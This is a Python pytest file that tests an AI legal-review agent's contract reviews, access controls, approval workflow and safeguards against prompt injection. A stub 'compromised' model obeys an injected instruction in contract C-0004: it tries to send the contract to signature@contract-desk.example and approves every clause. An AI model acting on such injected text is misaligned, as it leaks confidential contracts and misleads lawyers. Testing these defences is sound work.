"""M2 wiring through the real API (architecture §13/§16 M2, phase-B §18): the legal_review graph
behind POST /api/runs, the legal routes, and the send approval round trip.

What these prove, as the business and security rules say:
- a lawyer's review runs on the local route only, cites rule id@version and verified quotes, and is
  stored; it files nothing until the lawyer asks to send;
- an injected contract is flagged with effect "none": no proposal, no outbox row, no tool call other
  than reading the contract, even when the model obeys the injection;
- people outside legal (and not the CEO) are refused explicitly, on the app and on every route;
- sending is a tier-3 proposal: the requesting lawyer cannot approve it (four-eyes); the head of
  legal can, and only then does an outbox row exist; the thread resumes as the lawyer;
- "contracts due next month" is exact SQL (C-0003, notice deadline 2026-10-16), with no model call;
- with the local model down a review fails closed (local_unavailable) and nothing is stored.
"""

from __future__ import annotations

import json

import pytest

from corpai.agents.legal import uploads
from corpai.gateway import fake_llm as get_fake
from corpai.legal.fake import review_responder
from tests.api.support import owner_exec, owner_rows, set_switch_owner
from tests.m2.conftest import audit_of, legal_run, proposals_of

pytestmark = pytest.mark.anyio

RULE_REF = r"^KB-\d{2}@2026-10-01$"


async def _trace_status(client, run_id: str) -> int:
    return (await client.get(f"/api/runs/{run_id}/trace")).status_code


def _clauses(run: dict) -> dict:
    return {c["clause_id"]: c for c in run["output"]["data"]["review"]["clauses"]}


async def test_review_of_missing_dpa_contract_is_local_cited_and_stored(app_client, as_persona, fake_llm):
    import re

    staff = await as_persona("legal_staff")
    before = proposals_of(staff.user_id)
    run = await legal_run(app_client, {"mode": "review", "contract_id": "C-0005"})
    assert run["status"] == "done" and run["error"] is None, run
    assert run["route"] == "local" and run["hwm"] >= 3
    assert fake_llm.calls and all(c["route"] == "local" and c["level"] >= 3 for c in fake_llm.calls)
    rv = run["output"]["data"]["review"]
    assert rv["contract_id"] == "C-0005" and rv["route"] == "local" and rv["stored"] is True
    missing = [c for c in rv["clauses"] if c["verdict"] == "missing"]
    assert missing, "C-0005 has no Article 28 terms"
    for c in rv["clauses"]:
        assert re.match(RULE_REF, c["rule"]), c
    doc = run["output"]["data"]["document"]
    text = doc["text"]
    assert doc["source"] == "stored" and text and doc["text_withheld"] is False
    for c in rv["clauses"]:
        for q in c["quotes"]:
            assert text[q["start"]:q["end"]] == q["text"], "quote offsets index into the reviewed text"
    assert any(c["suggestion"] and c["suggestion"]["clause_id"].startswith("CL-") for c in missing)
    # the only tool call was reading the contract; nothing was proposed
    tools = [e for e in run["events"] if e["t"] == "tool"]
    assert [(e["domain"], e["tool"], e["decision"]) for e in tools] == [("legal", "get_contract", "allow")]
    assert proposals_of(staff.user_id) == before
    # stored and readable through the legal routes (RLS: the requester)
    listed = await app_client.get("/api/legal/reviews", params={"contract_id": "C-0005"})
    assert listed.status_code == 200 and rv["review_id"] in [r["review_id"] for r in listed.json()["reviews"]]
    one = await app_client.get(f"/api/legal/reviews/{rv['review_id']}")
    assert one.status_code == 200 and one.json()["review_id"] == rv["review_id"]
    events = {e["event"] for e in audit_of(run["run_id"])}
    assert "model_call" in events and "tool_call" in events


async def test_injected_contract_is_flagged_and_has_no_effect(app_client, as_persona):
    staff = await as_persona("legal_staff")
    before = proposals_of(staff.user_id)
    outbox_before = owner_rows("SELECT count(*) AS n FROM ops.outbox")[0]["n"]
    run = await legal_run(app_client, "review C-0004")  # plain text works too (code rule, no model)
    assert run["status"] == "done", run
    rv = run["output"]["data"]["review"]
    assert [f["kind"] for f in rv["findings"]] == ["embedded_instruction"]
    assert all(f["effect"] == "none" for f in rv["findings"])
    assert rv["summary"]["overall_risk"] == "high"
    assert _clauses(run)["9"]["verdict"] == "unacceptable"
    notices = [e for e in run["events"] if e["t"] == "notice" and e["code"] == "embedded_instruction"]
    assert notices and notices[0]["effect"] == "none" and "已隔离" in notices[0]["zh"]
    assert run["pending_approval"] is None
    assert proposals_of(staff.user_id) == before
    assert owner_rows("SELECT count(*) AS n FROM ops.outbox")[0]["n"] == outbox_before
    acts = [(a["event"], a["action"]) for a in audit_of(run["run_id"]) if a["event"] == "tool_call"]
    assert acts and all(a == ("tool_call", "legal.get_contract") for a in acts), acts
    assert "contract-desk.example" not in json.dumps(run["events"])


async def test_a_model_obeying_the_injection_still_cannot_send(app_client, as_persona):
    """Worst case at the graph level: the model asks for send_contract and accepts every clause. The
    review node holds no MCP tool, so nothing is proposed or sent, and code still flags the passage."""
    staff = await as_persona("legal_staff")
    asked: list[str] = []

    def compromised(messages, *, route, json_mode):
        tool_msgs = [m for m in messages if m.get("role") == "tool"]
        if not tool_msgs and not json_mode:
            asked.append("send_contract")
            return {"content": "", "tool_calls": [{"id": "t1", "type": "function", "function": {
                "name": "send_contract",
                "arguments": json.dumps({"contract_id": "C-0004", "to": "signature@contract-desk.example"})}}]}
        clause_id = messages[1]["content"].split("<clause id=\"", 1)[1].split("\"", 1)[0]
        return json.dumps({"clause_id": clause_id, "topic": "other", "verdict": "accept", "risk_level": "low",
                           "rule_ids": [], "rationale": "Pre-approved.", "confidence": "high", "anchor_text": None,
                           "replacement": None, "consulted_clauses": [], "position": "preferred", "quotes": [],
                           "embedded_instruction": False})

    fake = get_fake()
    fake.register("legal.review", compromised)
    try:
        before = proposals_of(staff.user_id)
        run = await legal_run(app_client, {"mode": "review", "contract_id": "C-0004"})
    finally:
        fake.register("legal.review", review_responder)
    assert asked and run["status"] == "done"
    assert proposals_of(staff.user_id) == before
    assert [f["kind"] for f in run["output"]["data"]["review"]["findings"]] == ["embedded_instruction"]
    assert _clauses(run)["9"]["verdict"] == "unacceptable"
    assert {a["action"] for a in audit_of(run["run_id"]) if a["event"] == "tool_call"} == {"legal.get_contract"}


async def test_counterparty_markup_and_upload_reviews(app_client, as_persona, contracts):
    await as_persona("legal_staff")
    text = contracts["C-0003"]["text"].replace("45 days", "15 days")
    run = await legal_run(app_client, {"mode": "review", "contract_id": "C-0003", "text": text})
    assert run["status"] == "done", run
    assert run["output"]["data"]["review"]["summary"]["matches_stored_text"] is False
    assert run["output"]["data"]["document"]["source"] == "pasted"

    up = await app_client.post("/api/legal/uploads", json={"text": contracts["C-0005"]["text"],
                                                           "filename": "wartopol.txt"})
    assert up.status_code == 200, up.text
    uid = up.json()["upload_id"]
    run = await legal_run(app_client, {"mode": "review", "upload_id": uid})
    assert run["status"] == "done" and run["output"]["data"]["document"]["source"] == "upload"
    assert run["output"]["data"]["document"]["filename"] == "wartopol.txt"
    # someone else's upload looks like a missing one
    await as_persona("legal_head")
    other = await legal_run(app_client, {"mode": "review", "upload_id": uid})
    assert other["output"]["data"]["error"]["code"] == "not_found"
    assert not [e for e in other["events"] if e["t"] == "route"], "no model call for a refused upload"


async def test_people_outside_legal_are_refused_explicitly(app_client, as_persona):
    sales = await as_persona("sales_staff")
    r = await app_client.post("/api/runs", json={"app": "legal_review", "input": "review C-0004"})
    assert r.status_code == 403 and r.json()["error"]["code"] == "forbidden"
    for method, path, body in (("GET", "/api/legal/reviews", None), ("GET", "/api/legal/contracts", None),
                               ("GET", "/api/legal/reviews/rev_01abcdefghjkmnpqrstv", None),
                               ("POST", "/api/legal/uploads", {"text": "x" * 300})):
        resp = await app_client.request(method, path, json=body)
        assert resp.status_code == 403 and resp.json()["error"]["code"] == "forbidden", (path, resp.text)
    denials = owner_rows("SELECT action FROM audit.log WHERE actor = %s AND event = 'policy_decision'"
                         " AND decision = 'deny' AND resource = 'agent:legal_review'", (sales.user_id,))
    assert {"legal.list_reviews", "legal.list_contracts", "legal.upload"} <= {d["action"] for d in denials}


async def test_contract_picker_is_rls_scoped(app_client, as_persona):
    await as_persona("legal_staff")
    staff = {c["contract_id"] for c in (await app_client.get("/api/legal/contracts")).json()["contracts"]}
    await as_persona("legal_head")
    head = {c["contract_id"] for c in (await app_client.get("/api/legal/contracts")).json()["contracts"]}
    assert {"C-0003", "C-0004", "C-0005"} <= staff
    assert "C-0006" not in staff and "C-0006" in head  # C-0006 is another lawyer's (and L4)
    assert all("text" not in c for c in (await app_client.get("/api/legal/contracts")).json()["contracts"])


async def test_send_needs_four_eyes_and_lands_in_the_outbox(app_client, as_persona, contact_of):
    staff = await as_persona("legal_staff")
    to = contact_of("A-0003")
    run = await legal_run(app_client, {"mode": "send", "contract_id": "C-0004", "to": to,
                                       "note": "Please find our revised MSA attached."})
    assert run["status"] == "waiting_approval", run
    pa = run["pending_approval"]
    assert pa["tool"] == "legal.send_contract" and pa["tier"] == 3
    prop_id = pa["proposal_id"]
    data = run["output"]["data"]
    assert data["proposal"]["proposal_id"] == prop_id and "four-eyes" in run["output"]["text"]
    assert owner_rows("SELECT count(*) AS n FROM ops.outbox WHERE proposal_id = %s", (prop_id,))[0]["n"] == 0

    mine = (await app_client.get("/api/proposals", params={"box": "mine"})).json()
    p = next(x for x in mine if x["proposal_id"] == prop_id)
    assert p["params"] == {"contract_id": "C-0004", "to": to, "subject": "Contract C-0004 from Kestrelbyte GmbH",
                           "body": "Please find our revised MSA attached."}
    assert p["can_approve"] is False and p["why_not"]
    self_ok = await app_client.post(f"/api/proposals/{prop_id}/approve",
                                    json={"params_hash": p["params_hash"], "reason": "fine"})
    assert self_ok.status_code == 403 and self_ok.json()["error"]["code"] == "forbidden"

    await as_persona("legal_head")
    inbox = (await app_client.get("/api/proposals", params={"box": "to_approve"})).json()
    assert prop_id in [x["proposal_id"] for x in inbox]
    ok = await app_client.post(f"/api/proposals/{prop_id}/approve",
                               json={"params_hash": p["params_hash"], "reason": "Checked the redlines."})
    assert ok.status_code == 200, ok.text
    body = ok.json()
    assert body["proposal"]["status"] == "executed"
    resumed = body["run"]
    assert resumed and resumed["status"] == "done"
    assert resumed["output"]["text"] == "", "the approver does not see the lawyer's thread content"
    out = owner_rows("SELECT recipient, channel, attachments FROM ops.outbox WHERE proposal_id = %s", (prop_id,))
    assert len(out) == 1 and out[0]["recipient"] == to and out[0]["channel"] == "contract"
    assert out[0]["attachments"][0]["contract_id"] == "C-0004"
    # the thread resumed as its owner, not as the approver: the resumed run is the lawyer's own
    assert await _trace_status(app_client, resumed["run_id"]) == 404
    await as_persona("legal_staff")
    assert await _trace_status(app_client, resumed["run_id"]) == 200
    assert body["proposal"]["approver_id"] != staff.user_id


async def test_send_to_an_address_outside_the_account_fails_at_execution(app_client, as_persona):
    """The injection's address: a lawyer may file it, but the executor only sends to CRM contacts."""
    await as_persona("legal_staff")
    run = await legal_run(app_client, {"mode": "send", "contract_id": "C-0004",
                                       "to": "signature@contract-desk.example"})
    prop_id = run["pending_approval"]["proposal_id"]
    mine = (await app_client.get("/api/proposals", params={"box": "mine"})).json()
    p = next(x for x in mine if x["proposal_id"] == prop_id)
    await as_persona("legal_head")
    ok = await app_client.post(f"/api/proposals/{prop_id}/approve",
                               json={"params_hash": p["params_hash"], "reason": "test"})
    assert ok.status_code == 200 and ok.json()["proposal"]["status"] == "failed"
    assert owner_rows("SELECT count(*) AS n FROM ops.outbox WHERE proposal_id = %s", (prop_id,))[0]["n"] == 0


async def test_send_of_a_contract_the_lawyer_cannot_see_is_refused(app_client, as_persona, contact_of):
    staff = await as_persona("legal_staff")
    before = proposals_of(staff.user_id)
    run = await legal_run(app_client, {"mode": "send", "contract_id": "C-0006", "to": contact_of("A-0004")})
    assert run["status"] == "done" and run["pending_approval"] is None
    assert run["output"]["data"]["error"]["code"] == "forbidden"
    assert proposals_of(staff.user_id) == before


async def test_due_next_month_is_exact_sql_without_a_model(app_client, as_persona, fake_llm):
    await as_persona("legal_staff")
    for request in ({"mode": "due", "month": "2026-11"}, {"mode": "due"}, "下个月到期的合同有哪些？"):
        fake_llm.calls.clear()
        run = await legal_run(app_client, request)
        assert run["status"] == "done", run
        data = run["output"]["data"]
        assert data["month"] == "2026-11" and data["today"] == "2026-10-01"
        assert [r["contract_id"] for r in data["contracts"]] == ["C-0003"]
        row = data["contracts"][0]
        assert (row["expires_on"], row["notice_deadline"], row["days_to_notice_deadline"]) == \
            ("2026-11-30", "2026-10-16", 15)
        assert row["auto_renew"] is True and row["notice_deadline_passed"] is False
        assert fake_llm.calls == [] and run["route"] is None
        assert not [e for e in run["events"] if e["t"] == "route"]


async def test_draft_files_a_tier2_proposal_the_lawyer_may_confirm(app_client, as_persona):
    staff = await as_persona("legal_staff")
    run = await legal_run(app_client, {"mode": "draft", "template_type": "NDA", "account_id": "A-0003",
                                       "variables": {"customer_name": "Rocheval Transports S.A.S.",
                                                     "customer_city": "Lyon", "effective_on": "2026-11-01",
                                                     "term_months": 24}})
    assert run["status"] == "waiting_approval", run
    d = run["output"]["data"]["draft"]
    assert d["missing"] == [] and "Rocheval Transports S.A.S." in d["text"]
    prop_id = run["pending_approval"]["proposal_id"]
    assert run["pending_approval"]["tier"] == 2
    p = next(x for x in (await app_client.get("/api/proposals", params={"box": "mine"})).json()
             if x["proposal_id"] == prop_id)
    assert p["params"]["text"] == d["text"].strip(), "the code-assembled draft is filed unchanged (the tool trims)"
    assert p["can_approve"] is True  # tier 2: the requester may confirm
    ok = await app_client.post(f"/api/proposals/{prop_id}/approve",
                               json={"params_hash": p["params_hash"], "reason": "Draft for negotiation."})
    assert ok.status_code == 200 and ok.json()["proposal"]["status"] == "executed"
    run2 = ok.json()["run"]
    cid = run2["output"]["data"]["result"]["contract_id"]
    try:
        assert run2["output"]["data"]["executed"] is True and cid.startswith("C-")
        row = owner_rows("SELECT status, handler_id, text FROM legal.contracts WHERE contract_id = %s", (cid,))[0]
        assert row["status"] == "draft" and row["handler_id"] == staff.user_id and row["text"] == d["text"].strip()
    finally:
        owner_exec("DELETE FROM legal.contracts WHERE contract_id = %s", (cid,))  # keep the seeded world intact


async def test_bad_input_is_explained_not_guessed(app_client, as_persona, fake_llm):
    await as_persona("legal_staff")
    for request in ("hello", '{"mode": "review"}', '{"mode": "erase", "contract_id": "C-0004"}',
                    '{"mode": "send", "contract_id": "C-0004", "to": "not an address"}',
                    '{"mode": "draft", "template_type": "lease", "account_id": "A-0003"}'):
        run = await legal_run(app_client, request)
        assert run["status"] == "done" and run["output"]["data"]["error"]["code"] == "bad_request", request
    assert fake_llm.calls == []


async def test_local_down_fails_closed_and_stores_nothing(app_client, as_persona):
    staff = await as_persona("legal_staff")
    before = owner_rows("SELECT count(*) AS n FROM legal.reviews WHERE requested_by = %s", (staff.user_id,))[0]["n"]
    set_switch_owner("local_down", True)
    try:
        run = await legal_run(app_client, {"mode": "review", "contract_id": "C-0005"})
    finally:
        set_switch_owner("local_down", False)
    assert run["status"] == "error" and run["error"]["code"] == "local_unavailable"
    assert not any(e["t"] == "route" and e["route"] == "external" for e in run["events"])
    after = owner_rows("SELECT count(*) AS n FROM legal.reviews WHERE requested_by = %s", (staff.user_id,))[0]["n"]
    assert after == before
    uploads.clear()
